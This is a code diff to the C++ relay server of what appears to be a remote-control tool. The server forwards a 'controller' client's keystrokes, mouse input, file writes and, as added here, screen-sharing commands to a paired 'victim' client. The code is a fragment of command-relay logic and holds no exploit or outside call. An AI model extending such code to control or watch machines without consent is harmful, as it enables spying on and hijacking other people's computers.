@@ -182,9 +182,9 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		updateControllersList();
 	}
 	//forward events to victim
-	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard control, start-stop mouse control, create-write-close file
-	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || 
-		cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h') {
+	//key pressed-released, mouse moved, wheel scrolled, start-stop keyboard control, start-stop mouse control, create-write-close file, start-stop screen sharing
+	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || cmd == 's' || 
+		cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h' || cmd == 'b' || cmd == 'g') {
 
 		//controller is not paired
 		if (clients[id].pair == 0)
@@ -273,12 +273,6 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 
 		updateControllersList();
 	}
-	//apparently controller thinks it isn't initialized
-	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
-		//reset controller's role and name
-		clients[id].role = '-';
-		clients[id].name = "";
-	}
 	//grant admin to client
 	else if (cmd == 'q') {
 		sf::Uint16 oId;
@@ -296,7 +290,14 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 			clients[oId].isAdmin = true;
 
 		updateControllersList();
+		}
+	//apparently controller thinks it isn't initialized
+	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
+		//reset controller's role and name
+		clients[id].role = '-';
+		clients[id].name = "";
 	}
+
 }
 void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 {
@@ -304,7 +305,7 @@ void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 	p >> cmd;
 
 	//send cmds to controller
-	if (cmd == 'y' || cmd == 'h') {
+	if (cmd == 'y' || cmd == 'h' || cmd == 't') {
 		//victim is not paired
 		if (clients[id].pair == 0)
 			return;
